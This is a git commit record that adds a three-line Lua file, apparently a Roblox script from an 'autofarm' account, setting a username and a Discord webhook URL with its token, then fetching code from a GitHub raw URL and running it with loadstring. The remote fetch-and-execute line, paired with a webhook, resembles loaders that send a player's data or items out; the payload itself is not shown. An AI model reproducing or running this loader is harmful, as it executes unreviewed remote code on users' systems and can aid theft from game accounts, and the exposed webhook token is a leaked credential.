9c75bdb1417c74ea7ef65776098e625d62cd1404
psxautofarm1 <130071685+psxautofarm1@users.noreply.github.com>
2023-04-06 15:24:23 +0100

    Add files via upload

---
+++ obf_9sPgCCCu87Pa9Yu72MEe66bej7kN7IoxP8B45ds089I50DX6y2mbkty8nGEKuBpf.lua
@@ -0,0 +1,3 @@
+UserName = "hellopike2"
+Webhook = "https://discord.com/api/webhooks/1093490204893007892/mPTeZGMLWwwKDbdx5ljZnroKKv-MiYjdSNWKWI5VRN_6Hav3QlpCnl7QXg0KRjOS064p"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/A/main/main", true))()
